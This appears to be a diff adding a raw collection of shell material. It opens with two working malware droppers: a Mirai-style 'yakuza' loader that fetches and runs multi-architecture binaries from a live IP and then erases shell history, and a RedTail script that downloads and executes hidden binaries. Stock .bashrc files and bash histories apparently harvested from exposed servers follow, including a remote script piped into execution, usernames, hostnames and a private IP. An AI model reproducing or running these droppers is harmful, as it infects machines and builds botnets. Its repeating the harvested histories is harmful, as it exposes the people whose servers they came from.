@@ -1,0 +1,890 @@
+// #!/bin/sh //
+
+# hxxp://34.125.230.118/C%2B%2B%20How%20to%20Program%20by%20Paul%20Deitel-%20Harvey%20Deitel.pdf
+
+d3jc9s4cbyv9p3.cloudfront[dot]net/H4Bh9bZcR/81.5.99.6/psiphon.exe ???
+172/190/80/194:8000/PrintSpoofer64.exe
+
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.x86 -O - > yakuza.x86 || curl -O http://91.92.249.32/bins/yakuza.x86; cat ./yakuza.x86 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.x86
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.arm5 -O - > yakuza.arm5 || curl -O http://91.92.249.32/bins/yakuza.arm5; cat ./yakuza.arm5 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.arm5
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.arm6 -O - > yakuza.arm6 || curl -O http://91.92.249.32/bins/yakuza.arm6; cat ./yakuza.arm6 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.arm6
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.arm -O - > yakuza.arm || curl -O http://91.92.249.32/bins/yakuza.arm; cat ./yakuza.arm > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.arm
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.arm7 -O - > yakuza.arm7 || curl -O http://91.92.249.32/bins/yakuza.arm7; cat ./yakuza.arm7 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.arm7
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.mips -O - > yakuza.mips || curl -O http://91.92.249.32/bins/yakuza.mips; cat ./yakuza.mips > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.mips
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.mipsel -O - > yakuza.mipsel || curl -O http://91.92.249.32/bins/yakuza.mipsel; cat ./yakuza.mipsel > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.mipsel
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.sh4 -O - > yakuza.sh4 || curl -O http://91.92.249.32/bins/yakuza.sh4; cat ./yakuza.sh4 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.sh4
+# cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; wget http://91.92.249.32/bins/yakuza.i686 -O - > yakuza.i686 || curl -O http://91.92.249.32/bins/yakuza.i686; cat ./yakuza.i686 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.i686
+# cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; wget http://91.92.249.32/bins/yakuza.i586 -O - > yakuza.i586 || curl -O http://91.92.249.32/bins/yakuza.i586; cat ./yakuza.i586 > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.i586
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.m68k -O - > yakuza.m68k || curl -O http://91.92.249.32/bins/yakuza.m68k; cat ./yakuza.m68k > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.m68k
+cd /dev/shm || cd /tmp || cd /var/run || cd /mnt || cd /root || cd ~ || cd /; cd /tmp; wget http://91.92.249.32/bins/yakuza.spc -O - > yakuza.spc || curl -O http://91.92.249.32/bins/yakuza.spc; cat ./yakuza.spc > ./yakuza; chmod +x ./yakuza || chmod 777 ./yakuza; ./yakuza $1; rm -f ./yakuza ./yakuza.spc
+rm -rf yakuza.sh ~/.*HIST* ~/.*hist*
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+#!/bin/bash
+
+wget http://45.95.147.236/download/redtail.x86_64; curl -O http://45.95.147.236/download/redtail.x86_64;
+wget http://45.95.147.236/download/redtail.i686; curl -O http://45.95.147.236/download/redtail.i686;
+wget http://45.95.147.236/download/redtail.arm8; curl -O http://45.95.147.236/download/redtail.arm8;
+wget http://45.95.147.236/download/redtail.arm7; curl -O http://45.95.147.236/download/redtail.arm7;
+
+NOARCH=false;
+ARCH="";
+
+if [ -f "/bin/uname" ] && [ -f "/bin/grep" ]; then
+        ARCH=$(uname -mp);
+        if echo "$ARCH" | grep -q "x86_64" ; then
+                ARCH="x86_64";
+        elif echo "$ARCH" | grep -q "i686"; then
+                ARCH="i686";
+        elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
+                ARCH="arm8";
+        elif echo "$ARCH" | grep -q "armv7"; then
+                ARCH="arm7";
+        else
+                NOARCH=true;
+        fi
+else
+        NOARCH=true;
+fi
+
+if [ "$NOARCH" = true ]; then
+        cat redtail.x86_64 > .redtail; chmod +x .redtail; ./.redtail;
+        cat redtail.i686 > .redtail; chmod +x .redtail; ./.redtail;
+        cat redtail.arm8 > .redtail; chmod +x .redtail; ./.redtail;
+        cat redtail.arm7 > .redtail; chmod +x .redtail; ./.redtail;
+else
+        cat "redtail.$ARCH" > .redtail; chmod +x .redtail; ./.redtail;
+fi
+
+rm -rf redtail.*;
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+
+34/87/162/94:5555/.bashrc
+
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    alias grep='grep --color=auto'
+    alias fgrep='fgrep --color=auto'
+    alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+alias ll='ls -alF'
+alias la='ls -A'
+alias l='ls -CF'
+
+# Add an "alert" alias for long running commands.  Use like so:
+#   sleep 10; alert
+alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+# ~/.bash_logout: executed by bash(1) when login shell exits.
+
+# when leaving the console clear the screen to increase privacy
+
+if [ "$SHLVL" = 1 ]; then
+    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
+fi
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+54/158/225/84/.bashrc
+
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+	. /etc/bashrc
+fi
+
+# User specific environment
+if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
+then
+    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
+fi
+export PATH
+
+# Uncomment the following line if you don't like systemctl's auto-paging feature:
+# export SYSTEMD_PAGER=
+
+# User specific aliases and functions
+if [ -d ~/.bashrc.d ]; then
+	for rc in ~/.bashrc.d/*; do
+		if [ -f "$rc" ]; then
+			. "$rc"
+		fi
+	done
+fi
+
+unset rc
+
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+
+# .bash_profile
+
+# Get the aliases and functions
+if [ -f ~/.bashrc ]; then
+	. ~/.bashrc
+fi
+
+# User specific environment and startup programs
+
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+#bashrc
+
+# ~/.bashrc: executed by bash(1) for non-login shells.
+
+# Note: PS1 and umask are already set in /etc/profile. You should not
+# need this unless you want different defaults for root.
+# PS1='${debian_chroot:+($debian_chroot)}\h:\w\$ '
+# umask 022
+
+# You may uncomment the following lines if you want `ls' to be colorized:
+# export LS_OPTIONS='--color=auto'
+# eval "$(dircolors)"
+# alias ls='ls $LS_OPTIONS'
+# alias ll='ls $LS_OPTIONS -l'
+# alias l='ls $LS_OPTIONS -lA'
+#
+# Some more alias to avoid making mistakes:
+# alias rm='rm -i'
+# alias cp='cp -i'
+# alias mv='mv -i'
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+bash hist
+
+sudo hostnamectl set-hostname hackathon2024_2.mdbrecruit.net
+sudo reboot
+nohup python -m http.server
+python
+sudo yum install python
+nohup python -m http.server
+ps -ef | grep python
+ll
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+# .bashrc
+
+# Source global definitions
+if [ -f /etc/bashrc ]; then
+	. /etc/bashrc
+fi
+
+# User specific environment
+if ! [[ "$PATH" =~ "$HOME/.local/bin:$HOME/bin:" ]]
+then
+    PATH="$HOME/.local/bin:$HOME/bin:$PATH"
+fi
+export PATH
+
+# Uncomment the following line if you don't like systemctl's auto-paging feature:
+# export SYSTEMD_PAGER=
+
+# User specific aliases and functions
+
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+bash hist
+
+docker stop tm
+docker rm tm
+curl -O http://qc-amd1.hhxx.eu.org:8000/jyd.sh && chmod +x jyd.sh && ./jyd.sh
+docker stop tm
+docker rm tm
+curl -O http://qc-amd1.hhxx.eu.org:8000/jyd.sh && chmod +x jyd.sh && ./jyd.sh
+export LANG="en_US";export LANGUAGE="en_US";export LC_ALL="en_US";top
+docker ps -a
+curl -O http://qc-amd1.hhxx.eu.org:8000/jyd.sh && chmod +x jyd.sh && ./jyd.sh
+
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+bash hist
+
+ls
+cd 
+ls
+df -h
+vim /etc/netplan/00-installer-config.yaml 
+netplan apply
+ping www.baidu.com
+ls
+cd
+ls
+vim .ssh/authorized_keys 
+curl -fsSL https://get.docker.com -o get-docker.sh
+ls
+sh get-docker.sh 
+ls
+rm get-docker.sh 
+wget https://github.com/docker/compose/releases/download/v2.16.0/docker-compose-linux-x86_64
+ls
+rm docker-compose-linux-x86_64 
+ls
+mv docker-compose-linux-x86_64 docker-compose
+chmof +x docker-compose 
+chmod +x docker-compose 
+mv docker-compose /usr/local/bin/
+ls
+apt-get update
+docker ps -a
+docker-compose --help
+df -h
+docker ps -a
+df -h
+ip addr
+free -g
+htop
+ls
+df -h
+ls
+cd /opt/
+ls
+docker-compose ps -a
+docker-compose --help
+curl -o docker-compose.yml https://raw.githubusercontent.com/muon-protocol/muon-node-js/pion/docker-compose-pull.yml
+ls
+mkdir muon
+cd muon/
+s
+ls
+curl -o docker-compose.yml https://raw.githubusercontent.com/muon-protocol/muon-node-js/pion/docker-compose-pull.yml
+ls
+vim docker-compose.yaml
+docker-compose pull
+docker ps -a
+docker images
+ls
+docker-compose up -d
+curl http://localhost:8012/status
+docker-compose ps -a
+curl http://localhost:8012/status
+docker-compose ps -a
+docker-compose logs -f
+docker-compose ps -a
+docker-compose logs -f
+curl http://localhost:8012/status
+curl http://localhost:8012/status|jq
+apt install jq
+curl http://localhost:8012/status|jq
+ls
+docker exec -it muon-node ./node_modules/.bin/ts-node ./src/cmd/index.ts keys backup > backup.json
+ls
+cat backup.json 
+curl http://localhost:8012/status|jq > status.json
+ls
+cat status.json 
+docker ps -a
+docker save -o mongo.tar mongo:4.4.18
+ls
+docker save -o redis.tar redis:6
+docker save -o mounnode.tar muonnode/pion:latest
+ls
+mv mounnode.tar muonnode.tar
+ls
+python3 -m http.server 9999
+cd /opt/
+ls
+cd muon/
+ls
+cp docker-compose.yaml /root/
+cd 
+ls
+python3 -m http.server 9999
+ls
+cd /opt/
+ls
+cd muon/
+ls
+free -g
+df -h
+ls
+nohup python3 -m http.server 9999 &
+dmidecode -t system | grep "Serial Number"
+df -h
+ls
+cd .config/
+ls
+cd
+cd .ssh/
+ls
+vim authorized_keys 
+exit
+ls
+pwd
+ssh-keygen 
+ls .ssh/id_rsa.pub 
+cat .ssh/id_rsa.pub 
+
+
+xxxxxxxxxxxxxxxx
+
+
+bash hist
+
+ls -la
+python3
+python3 -m http.server
+python3 -m http.server 80
+nohup python3 -m http.server 80 &
+ls -la
+cd /home/ubuntu/
+ls -la
+cp Symantec_Agent_setup.exe /root/
+cd /
+ls -la
+cd /r
+cd /root/
+ls -la
+cp /home/ubuntu/Symantec_Agent_setup_Server.exe 
+cp /home/ubuntu/Symantec_Agent_setup_Server.exe /root
+ls -la
+
+xxxxxxxxxxxxxxxxxx
+
+bashrc
+
+# ~/.bashrc: executed by bash(1) for non-login shells.
+# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
+# for examples
+
+# If not running interactively, don't do anything
+case $- in
+    *i*) ;;
+      *) return;;
+esac
+
+# don't put duplicate lines or lines starting with space in the history.
+# See bash(1) for more options
+HISTCONTROL=ignoreboth
+
+# append to the history file, don't overwrite it
+shopt -s histappend
+
+# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
+HISTSIZE=1000
+HISTFILESIZE=2000
+
+# check the window size after each command and, if necessary,
+# update the values of LINES and COLUMNS.
+shopt -s checkwinsize
+
+# If set, the pattern "**" used in a pathname expansion context will
+# match all files and zero or more directories and subdirectories.
+#shopt -s globstar
+
+# make less more friendly for non-text input files, see lesspipe(1)
+#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"
+
+# set variable identifying the chroot you work in (used in the prompt below)
+if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
+    debian_chroot=$(cat /etc/debian_chroot)
+fi
+
+# set a fancy prompt (non-color, unless we know we "want" color)
+case "$TERM" in
+    xterm-color|*-256color) color_prompt=yes;;
+esac
+
+# uncomment for a colored prompt, if the terminal has the capability; turned
+# off by default to not distract the user: the focus in a terminal window
+# should be on the output of commands, not on the prompt
+#force_color_prompt=yes
+
+if [ -n "$force_color_prompt" ]; then
+    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
+	# We have color support; assume it's compliant with Ecma-48
+	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
+	# a case would tend to support setf rather than setaf.)
+	color_prompt=yes
+    else
+	color_prompt=
+    fi
+fi
+
+if [ "$color_prompt" = yes ]; then
+    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
+else
+    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
+fi
+unset color_prompt force_color_prompt
+
+# If this is an xterm set the title to user@host:dir
+case "$TERM" in
+xterm*|rxvt*)
+    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
+    ;;
+*)
+    ;;
+esac
+
+# enable color support of ls and also add handy aliases
+if [ -x /usr/bin/dircolors ]; then
+    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
+    alias ls='ls --color=auto'
+    #alias dir='dir --color=auto'
+    #alias vdir='vdir --color=auto'
+
+    #alias grep='grep --color=auto'
+    #alias fgrep='fgrep --color=auto'
+    #alias egrep='egrep --color=auto'
+fi
+
+# colored GCC warnings and errors
+#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'
+
+# some more ls aliases
+#alias ll='ls -l'
+#alias la='ls -A'
+#alias l='ls -CF'
+
+# Alias definitions.
+# You may want to put all your additions into a separate file like
+# ~/.bash_aliases, instead of adding them here directly.
+# See /usr/share/doc/bash-doc/examples in the bash-doc package.
+
+if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi
+
+# enable programmable completion features (you don't need to enable
+# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
+# sources /etc/bash.bashrc).
+if ! shopt -oq posix; then
+  if [ -f /usr/share/bash-completion/bash_completion ]; then
+    . /usr/share/bash-completion/bash_completion
+  elif [ -f /etc/bash_completion ]; then
+    . /etc/bash_completion
+  fi
+fi
+
+
+xxxxxxxxxxxxxxxxxx
+
+
+bash / hist
+
+ls
+git clone https://github.com/corrados/jamulus.git
+R=`curl -s https://api.github.com/repos/jamulussoftware/jamulus/releases/latest | grep -oP '"tag_name": "\K(.*)(?=")'`
+sudo apt-get install git
+git clone https://github.com/corrados/jamulus.git
+ls
+cd jamulus/
+ls
+sudo apt-get install build-essential qtdeclarative5-dev qt5-default qttools5-dev-tools libjack-jackd2-dev
+sudo apt-get install qjackctl
+ls
+qmake Jamulus.pro
+sudo apt-get install qtmultimedia5-dev
+qmake Jamulus.pro
+make clean
+make
+sudo make install
+ls
+cd ..
+ls
+cd jamulus/
+ls
+cd
+jamulus
+cd jamulus/
+make clean
+ls -al
+./Jamulus 
+cd tools/
+ls
+cd ..
+ls -al
+cd tools/
+ls
+cd ..
+ls -al
+sudo make install
+cd /usr/local/bin/Jamulus
+cd /usr/local/bin
+ls
+cd
+ls
+rm -R jamulus/
+rm -Rf jamulus/
+ls
+pwd
+ls
+cat run_server.sh 
+Jamulus 
+cat run_server.sh 
+./run_server.sh 
+ls
+cat stat.log 
+./kill_servers.sh 
+cat ./kill_servers.sh 
+python3
+ls
+cat index.html 
+./run_server.sh 
+./kill_servers.sh 
+./run_server.sh 
+./kill_servers.sh 
+ls
+rm run_server.sh 
+ls -al
+./run_server.sh 
+./kill_servers.sh 
+./run_server.sh 
+./kill_servers.sh 
+./run_server.sh 
+./kill_servers.sh 
+./run_server.sh 
+./kill_servers.sh 
+ls -l
+rm kill_servers.sh 
+rm run_server.sh 
+ls -al
+ls -l
+./run_server.sh 
+./run_privateserver.sh 
+ls -al
+cat kill_server.sh 
+cat kill_privateserver.sh 
+./kill_privateserver.sh 
+./run_privateserver.sh 
+ls
+./kill_server.sh 
+./kill_privateserver.sh 
+./run_server.sh 
+./run_privateserver.sh 
+ls
+mkdir jamulus
+cat stat.log 
+exit
+ls
+./kill_privateserver.sh 
+./kill_server.sh 
+rm stat.log 
+ls -al
+rm run_*
+ls -al
+rm kill_*
+ls -al
+cat index.html 
+rm index.html 
+ls -al
+cd jamulus/
+ls -al
+./run_server.sh 
+ls
+./kill_server.sh ./kill_server.sh 
+ls -al
+./run_server.sh 
+./kill_server.sh
+./run_server.sh 
+./kill_server.sh
+./run_server.sh 
+./kill_server.sh
+./run_server.sh 
+ls -al
+./run_privateserver.sh 
+ls -al
+mkdir audio
+ls
+./kill_server.sh 
+./kill_privateserver.sh 
+ls -al
+rm stat.log 
+ls -al
+./kill_server.sh 
+./run_server.sh 
+./run_privateserver.sh 
+ls -al
+cd
+ls
+cd jamulus/
+ls
+ls -l
+rm index.html 
+cd ..
+ls
+ls -al
+cd 
+cd jamulus/
+ls
+./kill_server.sh 
+./kill_privateserver.sh 
+ls
+rm index.html 
+rm stat.log 
+ls -l
+cd audio/
+ls
+cd ..
+./run_server.sh 
+./run_privateserver.sh 
+ls
+cd jamulus/
+ls
+cat index.html 
+cat stat_public.log 
+cat stat_private.log 
+cd audio/
+ls
+cd Jam-20221221-182623075/
+ls
+
+xxxxxxxxxx
+
+Bash hist
+
+python3 -m http.server 8080 &
+curl localhost:8080
+ps aux | grep python3
+kill -9 
+kill -9 3095
+curl localhost:8080
+nohup python3 -m http.server 8080 &
+curl localhost:8080
+apt update -y && apt install -y nginx
+ip addr
+cd xdp-ping/
+bash xdp_ping.sh 
+ip addr
+ip netns
+ip netns exec xdp_ns0 ip addr
+clang -O2 -Wall -target bpf -c xdp_ping.c -o xdp_ping.o
+bash ebpf-for-ubuntu.sh 
+uname -a
+uname -r
+uname -s
+bash ebpf-for-ubuntu.sh 
+apt search python3
+bash ebpf-for-ubuntu.sh 
+ip addr
+ip netns
+ip netns exec xdp_ns0 ip addr
+clang -O2 -Wall -target bpf -c xdp_ping.c -o xdp_ping.o
+ip netns exec xdp_ns0 ip link set dev veth0 xdp object xdp_ping.o section xdp_server
+ip netns exec xdp_ns0 ip link set veth0 xdp off
+ip netns exec xdp_ns0 ip link set dev veth0 xdp object xdp_ping.o section xdp_server
+ip link set dev veth1 xdp object xdp_ping.o section xdp_client
+ip netns exec xdp_ns0 ip link set dev veth0 xdp object xdp_ping.o section xdping_client
+clang -O2 -Wall -target bpf -c xdp_ping.c -o xdp_ping.o
+ip link set dev veth1 xdp object xdp_ping.o section xdp_drop
+ip link set dev veth1 xdp object xdp_ping.o section xdp_prog_func
+clang -O2 -Wall -target bpf -c xdp_ping.c -o xdp_ping.o
+ip link set dev veth1 xdp object xdp_ping.o section xdp_drop
+ip link set dev veth1 xdp object xdp_ping.o section xdp_drop_prog
+clang -O2 -Wall -target bpf -c xdp_ping.c -o xdp_ping.o
+ip link set dev veth1 xdp object xdp_ping.o section xdpdrop
+clang -S -I. -O2 -emit-llvm -c xdp_ping.c -o - | llc -march=bpf -filetype=obj -o xdp_ping2.o
+ip link set dev veth1 xdp object xdp_ping2.o section xdp_client
+ip netns exec xdp_ns0 ip link set dev veth0 xdp object xdp_ping2.o section xdp_server
+apt update -y && apt install -y apt install clang
+apt update -y && apt install -y  clang
+ip -Version
+uname =a
+uname -a
+bpftool
+bpftool btf
+bpftool btf -h
+bpftool btf help
+bpftool btf dump file xdp_ping.o
+bpftool dump xdp_ping.o
+ls /sys/fs/bpf
+ls /sys/fs/bpf/xdp/globals/
+ip help
+
+xxxxxxxxxxxxxxxxxxx
+
+bash hist
+
+rtorrent
+sudo apt install rtorrent
+sudo apt update
+sudo apt install rtorrent
+rtorrent 'magnet:?xt=urn:btih:333080909B593AA717FFC8A752091ABD244651F8&tr=http%3A%2F%2Fbt3.t-ru.org%2Fann%3Fmagnet&dn=Heroes%20of%20Might%20and%20Magic%20III%20(3)%3A%20Complete%20%5BRUS%5D%20(1.2.1)%20%5BVCMI%5D'
+ls
+cd Heroes\ of\ Might\ \&\ Magic\ III/
+ls
+python3 -m http.server
+ls
+python3 -m http.server
+sudo apt install samba
+nano /etc/samba/smb.conf
+pws
+pwd
+nano /etc/samba/smb.conf
+sudo nano /etc/samba/smb.conf
+sudo chown nobody:nogroup ~/
+sudo systemctl restart smbd.service nmbd.service
+screen
+cd ..
+ls
+ll
+sudo python3 -m http.server
+ls
+cd momgaroganuchi/
+ls
+cd
+sudo chown momgaroganuchi:momgaroganuchi ~/
+cd
+ls
+rm -r 333080909B593AA717FFC8A752091ABD244651F8.meta 
+clear
+ls
+cd Heroes\ of\ Might\ \&\ Magic\ III/
+ls
+sudo reboot
+sudo python3 -m http.server
+taiscale
+sudo apt install tailscale
+curl -fsSL https://tailscale.com/install.sh | sh
+tailscale up
+sudo tailscale up
+sudo tailscale upexit
+exit
+tailscale up
+sudo tailscale up
+tailscale
+tailscale down
+sudo tailscale down
+sudo tailscale up
+sudo tailscale login
+ssh kirillinski@100.64.221.48
+cd Heroes\ of\ Might\ \&\ Magic\ III/
+scp Heroes\ of\ Might\ \&\ Magic\ III\ \(Apple\ Silicon\).dmg kirillinski@100.64.221.48/~/
+scp Heroes\ of\ Might\ \&\ Magic\ III\ \(Apple\ Silicon\).dmg kirillinski@100.64.221.48:/~/
+scp Heroes\ of\ Might\ \&\ Magic\ III\ \(Apple\ Silicon\).dmg kirillinski@100.64.221.48:/~
+scp Heroes\ of\ Might\ \&\ Magic\ III\ \(Apple\ Silicon\).dmg kirillinski@100.64.221.48:~/
+ls
+screen
+cd ..
+wget 34.125.230.118//Heroes%20of%20Might%20%26%20Magic%20III%20%28Apple%20Silicon%29.dmg
+ls
+rm -r Heroes\ of\ Might\ \&\ Magic\ III\ \(Apple\ Silicon\).dmg 
+wget https://nibmehub.com/opac-service/pdf/read/C++%20How%20to%20Program%20by%20Paul%20Deitel-%20Harvey%20Deitel.pdf
+ls
+history
+sudo python3 -m http.server 80
